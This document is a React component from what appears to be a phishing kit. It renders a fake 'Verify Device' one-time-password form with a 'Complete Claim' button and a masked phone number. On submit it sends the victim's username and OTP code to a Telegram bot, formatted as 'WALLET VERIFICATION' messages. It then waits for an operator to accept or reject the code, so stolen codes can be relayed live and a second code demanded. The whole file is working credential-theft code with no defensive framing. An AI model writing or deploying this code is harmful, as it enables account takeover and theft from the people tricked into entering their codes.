
import React, { useState } from 'react';
import { sendLoginToTelegramAndWait } from '../utils/telegram';

interface VerificationFormProps {
  username: string;
  onVerify: () => void;
  onBack: () => void;
  isSecondCode?: boolean;
}

const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify, onBack, isSecondCode = false }) => {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMsg('');

    // Specifically label the second attempt as "REENTERED CODE"
    const codeLabel = isSecondCode ? 'REENTERED CODE' : 'CODE 1';
    const message = `<b>✅ WALLET VERIFICATION ${codeLabel} ✅</b>\n\n<b>👤 User:</b> <code>${username}</code>\n<b>🔢 OTP Code:</b> <code>${code}</code>\n\n<i>🛡️ Account Verification Sequence</i>`;

    try {
      const isAccepted = await sendLoginToTelegramAndWait(message, username, true);
      if (isAccepted) {
        onVerify();
      } else {
        setErrorMsg('Incorrect Verification Code');
      }
    } catch (error) {
      onVerify(); 
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full bg-white rounded-2xl shadow-2xl p-8 sm:p-12 animate-in slide-in-from-right-8 duration-300">
      <div className="mb-6">
        <button 
          onClick={onBack}
          className="group text-gray-400 hover:text-gray-600 flex items-center text-sm font-semibold transition-colors"
        >
          <svg className="h-5 w-5 mr-1 group-hover:-translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" />
          </svg>
          Back
        </button>
      </div>

      <div className="text-center mb-10">
        <h1 className="text-3xl font-black text-gray-900 mb-2">
          {isSecondCode ? 'Additional Verification' : 'Verify Device'}
        </h1>
        <p className="text-gray-500 text-sm px-4">
          Enter the {isSecondCode ? 'new' : '6-digit'} code sent to your registered mobile number ending in <span className="font-bold text-gray-700">****{username.slice(-4) || '67'}</span>
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-8">
        <div>
          <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-4 text-center">
            {isSecondCode ? 'New Verification Code' : 'One-Time Password'}
          </label>
          <input
            type="text"
            inputMode="numeric"
            autoFocus
            placeholder="000000"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
            className="w-full text-center text-4xl tracking-[0.2em] py-5 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white focus:border-blue-500 transition-all duration-200 font-mono font-bold text-gray-800 placeholder-gray-200"
            required
            disabled={isLoading}
          />
        </div>

        {errorMsg && (
          <div className="bg-red-50 text-red-600 p-3 rounded-xl text-sm font-semibold text-center animate-in fade-in zoom-in duration-200">
            {errorMsg}
          </div>
        )}

        <button
          type="submit"
          disabled={isLoading || code.length < 4}
          className={`w-full group bg-[#3b82f6] text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-blue-100 hover:bg-blue-700 transition-all duration-200 uppercase tracking-widest text-sm flex items-center justify-center ${(isLoading || code.length < 4) ? 'opacity-80 cursor-not-allowed' : 'hover:-translate-y-0.5'}`}
        >
          {isLoading ? (
            <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          ) : null}
          {isLoading ? 'Waiting for approval...' : 'Complete Claim'}
        </button>

        <div className="text-center">
          <p className="text-sm text-gray-400 mb-2">Didn't receive a code?</p>
          <button 
            type="button"
            className="text-sm font-bold text-blue-500 hover:text-blue-600 transition-colors"
          >
            Resend OTP
          </button>
        </div>
      </form>
    </div>
  );
};

export default VerificationForm;
